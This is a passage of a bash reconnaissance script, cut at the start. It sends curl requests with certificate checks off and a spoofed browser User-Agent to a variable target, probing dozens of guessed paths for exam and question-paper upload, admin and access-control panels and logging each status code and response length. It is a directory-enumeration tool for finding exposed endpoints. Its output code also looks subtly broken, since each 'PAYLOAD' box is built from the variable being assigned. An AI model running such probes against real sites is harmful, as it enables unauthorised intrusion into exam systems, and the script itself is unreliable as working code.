code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

